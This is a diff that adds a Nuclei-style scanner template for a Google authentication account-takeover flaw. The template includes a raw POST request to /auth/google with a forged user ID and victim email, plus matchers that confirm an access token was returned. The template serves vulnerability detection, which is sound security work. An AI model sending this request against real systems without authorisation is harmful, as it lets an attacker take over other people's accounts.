@@ -1,0 +1,31 @@
+id: google-auth-account-takeover
+
+info:
+  name: Google Authentication Account Takeover
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    A critical vulnerability has been identified in the Google Authentication mechanism of the application. By manipulating the ID and email parameters in the authentication request, an attacker can obtain an access token for any user. This allows the attacker to take over any account without any user interaction, leading to a complete compromise of the victim’s account.
+
+http:
+  - raw:
+      - |
+        POST /auth/google HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "id": "1",
+          "email": "victim@example.com"
+        }
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "access_token"
+      - type: regex
+        regex:
+          - '"email":"victim@example.com"'
